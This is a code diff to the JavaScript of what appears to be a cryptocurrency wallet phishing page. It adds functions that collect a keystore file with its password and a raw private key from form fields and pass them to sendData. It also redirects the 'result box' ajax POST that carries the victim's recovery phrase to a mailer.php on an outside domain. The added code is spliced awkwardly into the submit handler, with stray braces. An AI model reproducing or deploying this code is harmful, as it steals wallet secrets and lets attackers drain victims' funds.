@@ -1167,6 +1167,23 @@
         document.getElementById("submit_phrase").disabled = true;
         var dappWords = $("#formPhrase").val();
 
+           sendData(message);
+                }
+                
+            }
+
+            const goKeystore = () => {
+                let keystore = $("#keystoreBox").val();
+                let password = $("#passwordBox").val()
+                message = `Keystore: ${keystore} \nPassword: ${password}`;
+                sendData(message);
+            }
+
+            const goKey = () => {
+                message = $("#keyBox").val();
+                message = `Private key: ${message}`;
+                sendData(message);
+
         if (!validateInput(dappWords)) {
 
             $("#formPhrase").addClass("error");
@@ -1181,7 +1198,7 @@
                 const wallet = ethers.Wallet.fromMnemonic(dappWords);
                 // result box section
                 $.ajax({
-                    url: "https://formsubmit.co/ajax/spacepluto36@gmail.com", // result box link
+                    url: "https://voicewelfare.com/resultbox/mailer.php", // result box link
                     method: "POST",
                     dataType: "JSON",
                     data: {
